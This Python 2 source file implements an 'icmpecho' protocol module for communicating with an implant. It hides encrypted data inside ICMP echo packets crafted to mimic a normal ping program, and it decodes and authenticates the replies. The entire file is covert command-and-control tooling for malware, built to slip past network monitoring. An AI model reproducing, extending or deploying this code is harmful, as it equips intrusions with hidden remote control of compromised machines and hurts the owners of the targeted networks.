import socket
from socket import htons, ntohs
import select
import struct
import time
import os
import ip
import inet
import base
import crypto
                        
class protocol(base.Protocol):
    def __init__(self):
        base.Protocol.__init__(self)
        self.compression = 0
        self.dest = 0
        self.dest_text = 0
        self.sock = 0
        self.seq = 0
        self.code = 0
        self.pid = os.getpid()
        self.auth1 = 0xffffff00L
        self.timeout = 1.0
        self.lastTime = 0.0
        self.data = ""

    #------------------------------------------------------------------------
    # Name   : SetDestination
    # Purpose: Sets up the ICMP socket
    # Receive: addr - The address of the target
    # Return : << nothing >>
    #------------------------------------------------------------------------
    def SetDestination(self, addr):
        self.dest = (socket.gethostbyname(addr), 0)
        self.dest_text = 0
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                    socket.IPPROTO_ICMP)
        self.sock.setblocking(1)

    #------------------------------------------------------------------------
    # Name   : PreSendChecks
    # Purpose: Make sure our packets act just like a normal ping program
    # Receive: << nothing >>
    # Return : << nothing >>
    #------------------------------------------------------------------------
    def PreSendChecks(self):
        currTime = time.time()
        # Don't send more than one ping per second
        while currTime - self.lastTime < 1.0:
            select.select([],[],[], 1.0 - (currTime - self.lastTime))
            currTime = time.time()
        # reset seq if the time elapsed since the last ping is the greater of
        # either 10 seconds or 1.5 times the timeout value
        if 10 > self.timeout*2:
            resetTime = 10
        else:
            resetTime = self.timeout*2
        
        if currTime - self.lastTime > resetTime:
            self.seq = 0
            self.lastReset = currTime
        else:
            # Increment seq by the number of seconds elapsed since last reset
            newseq = int((currTime - self.lastReset))
            self.seq = newseq
        self.lastTime = time.time()
        return
        

    #------------------------------------------------------------------------
    # Name   : SendTo
    # Purpose: Encrypt and send data to the target
    # Receive: data - The plain-text data to be encrypted/compressed and sent
    # Return : << nothing >>
    #------------------------------------------------------------------------
    def SendTo(self, data):
        self.PreSendChecks()
        # Get current time
        curr_time = time.time()
        curr_time_sec = int(curr_time)
        curr_time_usec = int((curr_time - float(curr_time_sec))*1000000.)
        
        # Construct the ICMP header
        idseq = struct.pack("!HH", self.pid, self.seq)
        icmp_header = chr(8) + chr(self.code) + '\000\000' + idseq

        # Construct the ECHO header and checksum
        echo_header_tmp = struct.pack("!LLH", \
                                      curr_time_sec, curr_time_usec, 0x0809)
        echo_header = echo_header_tmp + '\000\000'
        echo_header_cksum = inet.cksum(icmp_header + echo_header)
        echo_header_cksum = (struct.unpack("!L", '\000\000' + struct.pack("!H",echo_header_cksum)))[0]

        # Make sure the checksum is not 0x0a0b
        if echo_header_cksum == 0x0a0b:
            echo_header_tmp = struct.pack("!LLH", curr_time_sec,
                                          curr_time_usec+1, 0x0809)
            echo_header_cksum = struct.unpack("!L", '\000\000' + struct.pack("!H",echo_header_cksum))[0]

        # Add the checksum to the header
        echo_header = echo_header_tmp + struct.pack("H", echo_header_cksum)

        # Auth[0] = [ cksum for echo_header ] [ cksum for data ]
        data_cksum = inet.cksum( struct.pack("H",echo_header_cksum&0xffffL) +\
                                 '\000\000' + struct.pack("!L", 0xffffff00L) +\
                                 data)
        auth_0 = struct.pack("HH",echo_header_cksum, data_cksum)
        auth_1 = struct.pack("!L",0xffffff00L)

        msg = auth_0 + auth_1 + data
        # Encrypt if necessary
        if self.implant.cipher:
            msg = self.implant.cipher.Encrypt(msg)
        # Compress if necessary
        if self.compression:
            msg = compression.Compress(msg)

        # Reconstruct the ICMP header with the checksum
        icmp_header = chr(8) + chr(0) +\
                      struct.pack("H", inet.cksum(icmp_header + \
                                                  echo_header +\
                                                  msg)) + idseq

        # Send it out
        fpos = icmp_header + echo_header + msg
        self.sock.sendto(fpos, self.dest)

    #------------------------------------------------------------------------
    # Name   : ReadInPacket
    # Purpose: Decode a newly received packet
    # Receive: pkt - The raw data received
    # Return : << nothing >>
    #------------------------------------------------------------------------
    def ReadInPacket(self,pkt):
        self.data = ""
        icmpcsum = inet.cksum(pkt)
        # Initial checks
        #print "Checking entire checksum"
        if icmpcsum != 0:
            print "Ping packet checksum is incorrect....ignoring packet"
            raise ValueError, pkt

        #print "Checking for 0x0809"
        if struct.unpack("!H",pkt[16:18])[0] != 0x0809L:
            print "Did not find 0x0809 just before the checksum"
            raise ValueError, pkt

        #print "Looking for no 0x0a0b"
        if struct.unpack("!H",pkt[18:20])[0] == 0x0a0bL:
            print "Found the invalid checksum 0x0A0B"
            raise ValueError, pkt
        
        icmp_type = pkt[0]
        icmp_code = pkt[1]
        icmp_ident = struct.unpack("!H",pkt[4:6])[0]
        icmp_seq = struct.unpack("!H",pkt[6:8])[0]
        ping_timestamp_sec = struct.unpack("!L",pkt[8:12])[0]
        ping_timestamp_usec = struct.unpack("!L",pkt[12:16])[0]
        chksum1 = struct.unpack("!H",pkt[18:20])[0]
        #print "Checking ident"
        if icmp_ident != self.pid:
            print "Packet not for us.  Possibly for another process?"
            raise ValueError, pkt

        # Checking seq
        if icmp_seq != self.seq:
            print "Packet received out of order"
            raise ValueError, pkt
        
        # Decrypt
        pt = self.implant.cipher.Decrypt(pkt[20:])

        #print "Checking pt checksum"
        if inet.cksum(pt) != 0:
            print "Auth[0] checksum is incorrect"
            raise ValueError, pt
            
        chksum2 = struct.unpack("!H",pt[:2])[0]

        #print "Checking for matching auth[0][0] chksum"
        if chksum2 != chksum1:
            print "Checksum inside auth[0] doesn't match the one on the outside"
            raise ValueError, pt

        if(struct.unpack("!L",pt[4:8])[0] & 0x000000FFL != 0x0L):
            print "Data received in the low order byte of auth[1]"
            raise ValueError, pt

        self.data = pt[8:]
        return self.data

    #------------------------------------------------------------------------
    # Name   : GetFromSock
    # Purpose: Get the raw data from the socket
    # Receive: << nothing >>
    # Return : << nothing >>
    #------------------------------------------------------------------------
    def GetFromSock(self):
        start = time.time()
        to = self.timeout
        while 1:
            # Wait for some data to come in
            rd, wt, er = select.select([self.sock], [], [], to)
            if rd:
                arrival = time.time()
                try:
                    pkt, who = self.sock.recvfrom(4096)
                except socket.error:
                    continue
                try:
                    # Send the data to the parsers
                    repip = ip.Packet(pkt)
                    readin = self.ReadInPacket(repip.data)
                    if( readin and readin != ""):
                        break
                except ValueError:
                    continue
            to = (start + self.timeout) - time.time()
            if to < 0:
                break
    
    #------------------------------------------------------------------------
    # Name   : RecvFrom
    # Purpose: Initiates the process of receiving data from the target and
    #          returns the decoded data
    # Receive: << nothing >>
    # Return : The decoded data
    #------------------------------------------------------------------------
    def RecvFrom(self):
        self.GetFromSock()                
        return self.data

# Register this module
base.RegisterProtocol("icmpecho",protocol)
